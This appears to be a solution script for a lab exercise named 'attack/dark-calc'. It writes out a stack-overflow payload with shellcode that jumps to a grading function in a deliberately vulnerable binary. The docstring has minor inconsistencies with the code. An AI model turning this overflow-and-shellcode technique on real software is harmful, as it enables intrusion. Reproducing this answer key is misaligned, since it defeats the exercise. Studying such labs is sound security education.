#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

The constructor init_fixed_stack() places the call stack at the fixed,
executable region around 0x72100800000, so the 16-byte buffer
`expression` always sits at 0x721000800fd0 and its bytes are runnable.

Shellcode (12 bytes), written at the start of the buffer:
    mov edi, 4          ; bf 04 00 00 00   first arg grade = 4
    mov eax, 0x401a87   ; b8 87 1a 40 00   grade_eval
    call rax            ; ff d0            grade_eval(4)

The overflow then overwrites the saved rbp and the return address with
the fixed buffer address, so input() "returns" into our shellcode.
After input's ret, rsp = 0x721000800ff0 (16-byte aligned), so the
call inside the shellcode enters grade_eval with the ABI alignment.
"""
import struct
import sys

GRADE_EVAL = 0x401A87
BUFFER = 0x721000800FD0

shellcode = b"\xbf\x04\x00\x00\x00"
shellcode += b"\xb8" + struct.pack("<I", GRADE_EVAL)
shellcode += b"\xff\xd0"

payload = shellcode + b"\x90" * (16 - len(shellcode))
payload += b"B" * 8
payload += struct.pack("<Q", BUFFER)
payload += b"\n"

sys.stdout.buffer.write(payload)
